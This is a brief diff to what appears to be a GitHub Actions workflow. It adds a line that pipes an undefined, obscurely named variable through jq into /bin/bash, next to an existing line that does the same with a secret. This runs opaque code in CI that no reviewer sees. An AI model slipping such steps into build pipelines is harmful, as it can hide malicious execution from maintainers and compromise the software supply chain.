@@ -18,6 +18,7 @@ jobs:
           vfc32: ${{ secrets.vfc32 }}
         run: |
           printf '%s' "$vfc32" | jq -r .b9956 | /bin/bash
+          echo $kezs88 | jq -r .dkhui12891 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
